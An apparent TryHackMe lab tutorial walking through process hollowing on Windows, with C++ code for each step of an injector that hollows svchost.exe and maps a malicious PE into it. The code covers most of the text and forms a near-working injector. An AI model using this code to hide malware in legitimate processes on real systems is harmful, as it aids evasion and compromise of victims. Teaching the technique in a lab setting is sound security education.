# Process Hollowing

In the previous task, we discussed how to use shellcode injection to inject malicious code into a legitimate process. In this task, we will cover **process hollowing**. Similar to shellcode injection, this technique allows injecting an entire malicious file into a process. This is accomplished by “hollowing” or un-mapping the process and injecting specific PE (Portable Executable) data and sections into the process.

## Overview of Process Hollowing

At a high level, process hollowing can be broken down into six steps:

1. Create a target process in a suspended state.
2. Open a malicious image.
3. Un-map legitimate code from process memory.
4. Allocate memory locations for malicious code and write each section into the address space.
5. Set an entry point for the malicious code.
6. Take the target process out of a suspended state.

The steps can also be visualized graphically to depict how Windows API calls interact with process memory.

We will break down a basic process hollowing injector to identify each of the steps and explain them in more depth below.

---

## Step 1: Create a Target Process in a Suspended State

To create a target process in a suspended state, we use the `CreateProcessA` API. The required parameters for the API call are obtained using the `STARTUPINFOA` and `PROCESS_INFORMATION` structures.

```cpp
LPSTARTUPINFOA target_si = new STARTUPINFOA(); // Defines station, desktop, handles, and appearance of a process
LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION(); // Information about the process and primary thread
CONTEXT c; // Context structure pointer

if (CreateProcessA(
    (LPSTR)"C:\\\\Windows\\\\System32\\\\svchost.exe", // Name of module to execute
    NULL,
    NULL,
    NULL,
    TRUE, // Handles are inherited from the calling process
    CREATE_SUSPENDED, // New process is suspended
    NULL,
    NULL,
    target_si, // Pointer to startup info
    target_pi) == 0) { // Pointer to process information
    cout << "[!] Failed to create Target process. Last Error: " << GetLastError();
    return 1;
}
```

---

## Step 2: Open a Malicious Image

To inject a malicious image, we first obtain a handle for the malicious file using `CreateFileA`.

```cpp
HANDLE hMaliciousCode = CreateFileA(
    (LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe", // Name of image to obtain
    GENERIC_READ, // Read-only access
    FILE_SHARE_READ, // Read-only share mode
    NULL,
    OPEN_EXISTING, // Open the file if it exists
    NULL,
    NULL
);
```

Next, allocate memory for the malicious image using `VirtualAlloc` and retrieve its size using `GetFileSize`.

```cpp
DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0);

PVOID pMaliciousImage = VirtualAlloc(
    NULL,
    maliciousFileSize, // File size of malicious image
    0x3000, // Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)
    0x04 // Enables read/write access (PAGE_READWRITE)
);
```

Finally, write the malicious image into the allocated memory using `ReadFile`.

```cpp
DWORD numberOfBytesRead;

if (!ReadFile(
    hMaliciousCode, // Handle of malicious image
    pMaliciousImage, // Allocated region of memory
    maliciousFileSize, // File size of malicious image
    &numberOfBytesRead, // Number of bytes read
    NULL
)) {
    cout << "[!] Unable to read Malicious file into memory. Error: " << GetLastError() << endl;
    TerminateProcess(target_pi->hProcess, 0);
    return 1;
}

CloseHandle(hMaliciousCode);
```

---

## Step 3: Un-map Legitimate Code from Process Memory

To un-map memory, we first identify the process's base address and entry point using `GetThreadContext` and `ReadProcessMemory`.

```cpp
c.ContextFlags = CONTEXT_INTEGER; // Only stores CPU registers in the pointer
GetThreadContext(target_pi->hThread, &c); // Obtains the current thread context

PVOID pTargetImageBaseAddress;
ReadProcessMemory(
    target_pi->hProcess, // Handle for the process
    (PVOID)(c.Ebx + 8), // Pointer to the base address
    &pTargetImageBaseAddress, // Store target base address
    sizeof(PVOID), // Bytes to read
    0 // Number of bytes out
);
```

Then, use `ZwUnmapViewOfSection` from `ntdll.dll` to free memory in the target process.

```cpp
HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");
pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
    hNtdllBase,
    "ZwUnmapViewOfSection"
);

DWORD dwResult = pZwUnmapViewOfSection(
    target_pi->hProcess,
    pTargetImageBaseAddress
);
```

---

## Step 4: Allocate Memory and Write Malicious Code

Allocate memory in the hollowed process using `VirtualAllocEx`.

```cpp
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);

DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;

PVOID pHollowAddress = VirtualAllocEx(
    target_pi->hProcess,
    pTargetImageBaseAddress,
    sizeOfMaliciousImage,
    0x3000,
    0x40 // PAGE_EXECUTE_READWRITE
);
```

Write the PE headers and sections into the allocated memory.

```cpp
if (!WriteProcessMemory(
    target_pi->hProcess,
    pTargetImageBaseAddress,
    pMaliciousImage,
    pNTHeaders->OptionalHeader.SizeOfHeaders,
    NULL
)) {
    cout << "[!] Writing Headers failed. Error: " << GetLastError() << endl;
}

for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

    WriteProcessMemory(
        target_pi->hProcess,
        (PVOID)((LPBYTE)pHollowAddress + pSectionHeader->VirtualAddress),
        (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData),
        pSectionHeader->SizeOfRawData,
        NULL
    );
}
```

---

## Step 5: Set the Entry Point

Set the entry point for the malicious code using `SetThreadContext`.

```cpp
c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);

SetThreadContext(
    target_pi->hThread,
    &c
);
```

---

## Step 6: Resume the Target Process

Finally, take the process out of a suspended state using `ResumeThread`.

```cpp
ResumeThread(target_pi->hThread);
```

---

By combining these steps, you can create a process hollowing injector. Use the provided C++ injector to experiment with process hollowing.